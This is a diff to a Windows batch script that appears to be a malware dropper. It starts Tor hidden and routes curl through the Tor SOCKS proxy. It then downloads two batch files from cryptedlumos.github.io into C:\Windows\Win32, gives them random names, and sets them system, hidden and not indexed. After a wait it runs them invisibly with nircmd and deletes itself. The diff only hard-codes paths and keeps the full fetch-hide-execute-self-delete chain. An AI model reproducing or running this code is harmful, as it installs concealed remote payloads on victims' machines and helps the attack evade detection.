@@ -6,7 +6,7 @@ if errorlevel 1 goto Connectivitycheck
 
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
 if not errorlevel 1 (echo) else (
-  nircmd exec hide "%systemdrive%\Tor\tor.exe"
+  nircmd exec hide "C:\Tor\tor.exe"
 )
 
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
@@ -16,9 +16,9 @@ if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else 
 
 set "win32=%random%"
 set "win64=%random%"
-curl.exe %proxy% https://cryptedlumos.github.io/win32.bat --output "%windir%\Win32\%win32%.bat" && attrib +s +h +i "%windir%\Win32\%win32%.bat"
-curl.exe %proxy% https://cryptedlumos.github.io/win64.bat --output "%windir%\Win32\%win64%.bat" && attrib +s +h +i "%windir%\Win32\%win64%.bat"
+curl.exe %proxy% https://cryptedlumos.github.io/win32.bat --output "C:\Windows\Win32\%win32%.bat" && attrib +s +h +i "C:\Windows\Win32\%win32%.bat"
+curl.exe %proxy% https://cryptedlumos.github.io/win64.bat --output "C:\Windows\Win32\%win64%.bat" && attrib +s +h +i "C:\Windows\Win32\%win64%.bat"
 timeout -t 150
-nircmd exec hide "%windir%\Win32\%win32%.bat"
-nircmd exec hide "%windir%\Win32\%win64%.bat"
+nircmd exec hide "C:\Windows\Win32\%win32%.bat"
+nircmd exec hide "C:\Windows\Win32\%win64%.bat"
 DEL /s /f /q /a "%~f0"
